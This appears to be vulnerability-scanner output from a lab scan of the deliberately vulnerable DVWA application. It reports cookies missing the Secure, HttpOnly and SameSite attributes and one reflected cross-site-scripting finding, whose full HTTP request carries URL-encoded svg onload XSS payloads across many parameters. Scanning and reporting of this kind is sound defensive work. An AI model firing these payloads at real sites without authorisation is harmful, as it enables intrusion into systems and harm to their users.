info.name: Cookies without Secure attribute - Detect
author: vthiery
rj coleman
info.description: Checks whether cookies in the HTTP response contain the Secure attribute. If the Secure flag is set, it means that the cookie can only be transmitted over HTTPS
info.impact: Lack of Secure flag on cookies allows the cookie to be sent over unsecure HTTP, making it vulnerable to man-in-the-middle (MITM) attacks.
info.remediation: Ensure that all cookies are set with the Secure attribute to prevent MITM attacks.

info.name: Cookies without HttpOnly attribute - Detect
author: rj coleman
mr.bobo hp
info.description: Checks whether cookies in the HTTP response contain the HttpOnly attribute. If the HttpOnly flag is set, it means that the cookie is HTTP-only
info.impact: Lack of HttpOnly flag on cookies increases the risk of client-side attacks, compromising user session security and data privacy.
info.remediation: Ensure that all cookies are set with the HttpOnly attribute to prevent client-side access.

info.name: Fuzzing Parameters - Cross-Site Scripting
author: kazet
info.description: Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.

request:
GET /DVWA/vulnerabilities/xss_r/?name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E HTTP/1.1
Host: 192.168.0.156
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Cookie: security=low; PHPSESSID=2fvposen5olalcvels6q2dnh5n
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Connection: close Cache-Control: no-cache, must-revalidate Content-Type: text/html;charset=utf-8 Date: Sun, 23 Nov 2025 00:02:28 GMT Expires: Tue, 23 Jun 2009 12:00:00 GMT Pragma: no-cache Server: Apache/2.4.62 (Debian) Vary: Accept-Encoding X-Xss-Protection: 0 Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA)

info.name: Missing Cookie SameSite Strict
author: lucky0x0d
pulsesecurity.co.nz
info.description: Identified cookies that lacked the samesite=strict attribute, which prevented enforcement of restrictions on cross-domain cookie transmission.
